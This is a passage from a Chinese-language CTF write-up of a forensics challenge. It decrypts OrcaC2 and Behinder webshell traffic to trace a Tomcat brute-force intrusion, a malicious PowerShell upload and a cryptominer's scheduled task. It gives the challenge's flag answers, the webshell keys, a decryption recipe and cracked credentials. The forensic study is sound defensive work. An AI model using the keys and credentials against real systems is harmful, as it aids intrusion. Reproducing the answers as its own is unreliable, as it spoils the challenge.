<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pJB`-v)t^ZAsP$|r -&gt; a524c43df3063c33cfd72e2bf1fd32f6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. a524c43df3063c33cfd72e2bf1fd32f6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task13">task13<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task13" class="hash-link" aria-label="task13的直接链接" title="task13的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者使用了什么家族的 C2? 示例: PoshC2</li>
</ol>
</blockquote>
<p>在 task11 中已经得到了答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. OrcaC2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="master-of-dfir---coffee">Master of DFIR - Coffee<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#master-of-dfir---coffee" class="hash-link" aria-label="Master of DFIR - Coffee的直接链接" title="Master of DFIR - Coffee的直接链接">​</a></h2>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>题目描述</div><div class="admonitionContent_BuS1"><p>随着调查的深入你发现情况比你预想得要复杂很多, 你逐步发现了更多入侵的痕迹</p><p>"看起来不能这么早就休息了" 于是你继续投身于下一步的调查中</p><p>你需要继续完成题目帮助饥渴 C 猫发掘所有的真相</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task1-1">task1<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task1-1" class="hash-link" aria-label="task1的直接链接" title="task1的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>受害者主机名是什么? 示例: DESKTOP-J6QZVBD</p>
</li>
<li>
<p>受害者操作系统是什么版本? 以 C2 回显为准 示例: Microsoft Windows 7 专业版</p>
</li>
</ol>
</blockquote>
<p>已经得知 RAT 的通信 AES key 之后，就可以解密 RAT 通信的返回包</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241120-232056-4be47b282ff9916296f900a767eb6d3b.png" width="1952" height="1542" class="img_ev3q"></p>
<p>执行解密</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241122-232223-198f59efbd76cd4c8a2df6c92d8f4dbe.png" width="2559" height="1371" class="img_ev3q"></p>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. DESKTOP-28DGVAU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Microsoft Windows 10 教育版</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task2-1">task2<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task2-1" class="hash-link" aria-label="task2的直接链接" title="task2的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>控制端 ClientId 是多少? 示例: c723d01b-5dc1-2601</p>
</li>
<li>
<p>受害者主机的 systemId 是多少? 示例: 1b0679be72ad976ad5d491ad57a5eec0</p>
</li>
</ol>
</blockquote>
<p>在上一题中就有</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. a55330f4-83c2-4081</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. 9e4a7e9ebdd51913b5d724be14868e85</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task3-1">task3<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task3-1" class="hash-link" aria-label="task3的直接链接" title="task3的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者下载的文件的保存名是什么？ 示例: flag.txt</p>
</li>
<li>
<p>内网运行的云服务的名称叫什么 示例: 金山云</p>
</li>
</ol>
</blockquote>
<p>继续解密服务端的返回包</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241124-232454-3a4c7eb661d5c54f35d05b4c1f5bd42d.png" width="2559" height="1371" class="img_ev3q"></p>
<p>根据字段 <code>SaveFileName</code> 可以确定执行了文件下载，文件名为 <code>history</code></p>
<p>同时，攻击者获取了一个 Sqlite 文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-232621-bb9de673ae8a82af2867091ee2a64138.png" width="2559" height="1371" class="img_ev3q"></p>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. history</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. 浩瀚云</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task4-1">task4<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task4-1" class="hash-link" aria-label="task4的直接链接" title="task4的直接链接">​</a></h3>
<blockquote>
<ol>
<li>tomcat 的用户名和密码是多少? 示例: admin<!-- -->:admin</li>
</ol>
</blockquote>
<p>在后续的流量中，发现攻击者尝试爆破 Tomcat 的凭据</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241127-232733-4f3488b08d6c23636604f92a95859755.png" width="1711" height="1436" class="img_ev3q"></p>
<p>排查后续流量，这个没有返回 401</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241130-233030-57880c4a44e16dc29ed5cb9543db3e97.png" width="1711" height="1436" class="img_ev3q"></p>
<p>即可确定正确的凭据 <code>dG9tY2F0OmJlYXV0aWZ1bA==</code></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dG9tY2F0OmJlYXV0aWZ1bA== -&gt; tomcat:beautiful</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. tomcat:beautiful</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task5-1">task5<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task5-1" class="hash-link" aria-label="task5的直接链接" title="task5的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>webshell 的路径? 示例:/memshell/favicon.ico</p>
</li>
<li>
<p>攻击者上传的文件名? 示例: flag.txt</p>
</li>
</ol>
</blockquote>
<p>在攻击者成功登录之后，执行了上传</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241132-233210-cee44c08dce8e1d491641e836fff2f15.png" width="1711" height="1436" class="img_ev3q"></p>
<p>将攻击者上传的 <code>help.war</code> 提取出来分析</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241135-233549-f8c8da0421b3cadb880b600d9907f3c4.png" width="2152" height="1414" class="img_ev3q"></p>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. /help.jsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. help.war</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task6-1">task6<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task6-1" class="hash-link" aria-label="task6的直接链接" title="task6的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>webshell 中加密算法的密钥是什么, 若有多个, 以加密顺序用_连接 示例: keya_keyb</p>
</li>
<li>
<p>黑客使用 webshell 管理工具是什么? (注意: 全小写) 示例: antsword</p>
</li>
</ol>
</blockquote>
<p>攻击者上传的 war 文件中的 jsp 文件，使用动态加载了 Java Class</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241140-234033-df9038722e6d41a369fb843d58f830c7.png" width="1784" height="790" class="img_ev3q"></p>
<p>jsp 文件中存在有多个 Java Class</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241147-234701-d3a6e8e24454b74d4237d0c5832394f7.png" width="2320" height="1496" class="img_ev3q"></p>
<p>逐个分析，可以发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241147-234739-77784ebcdf2d920ead97791dd7595647.png" width="2115" height="1472" class="img_ev3q"></p>
<p>并且 Java Class 的操作方式，符合冰蝎（behinder）的逻辑</p>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. b42e327feb5d923b_82ca9b43c1b8ef8c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. behinder</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task7-1">task7<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task7-1" class="hash-link" aria-label="task7的直接链接" title="task7的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>被黑客窃取的云存储服务的管理员账户和密码是多少? 示例: admin<!-- -->:admin</p>
</li>
<li>
<p>攻击者通过 webshell 上传的恶意文件是什么? 示例: malware.exe</p>
</li>
</ol>
</blockquote>
<p>已经知道 Webshell 的加解密实现之后，就可以编写处理流程</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">From_Base64('A-Za-z0-9+/=',true,false)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">XOR({'option':'UTF8','string':'2ca9b43c1b8ef8c8'},'Standard',false)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AES_Decrypt({'option':'UTF8','string':'b42e327feb5d923b'},{'option':'Hex','string':''},'ECB/NoPadding','Raw','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Zlib_Inflate(0,0,'Adaptive',false,false)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>逐个解密服务端的返回包，可以发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241152-235213-45c360de24667ceaae0eab293545debc.png" width="1711" height="1436" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241152-235252-2112e591578b0f89a1221180692a5097.png" width="2559" height="1371" class="img_ev3q"></p>
<p>将其中的 <code>msg</code> 数据提取出来</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241153-235314-2dd570810954514a198c900269d33589.png" width="2559" height="1371" class="img_ev3q"></p>
<p>将 Sqlite 数据库文件导出，发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241154-235400-3079894e7984eb25cc01cfb0cf0ca0c0.png" width="2034" height="1380" class="img_ev3q"></p>
<p>查询 MD5 彩虹表，得到</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">6fb5d7cd1041571a52c0b23707239a08 -&gt; vipvip123</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>并且继续追踪流量，解密请求包，可以发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241100-000033-93400e4ff9ed3f4ab58008923d6efee0.png" width="1711" height="1436" class="img_ev3q"></p>
<p>对 Java Class 进行反编译</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241101-000113-1f9a297be12bf6d17cc48b5f2a498e2e.png" width="1815" height="1157" class="img_ev3q"></p>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. hhcloud:vipvip123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. e.ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task8-1">task8<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task8-1" class="hash-link" aria-label="task8的直接链接" title="task8的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>恶意脚本设置的计划任务叫什么? 示例: Miner</p>
</li>
<li>
<p>挖矿程序落地的文件是什么？ 示例: miner.exe</p>
</li>
</ol>
</blockquote>
<p>继续跟进流量</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241102-000249-156b1369a5ae4ff74bded8ee24ff45ef.png" width="1280" height="770" class="img_ev3q"></p>
<p>解密得到</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"msg"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"成功: 成功创建计划任务 \"Update service for Windows Service\"。\r\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">"status"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"c3VjY2Vzcw=="</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对所有流量的请求包进行解密，还可以找到攻击者部署的文件 <code>sys_update.exe</code></p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. Update service for Windows Service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. sys_update.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
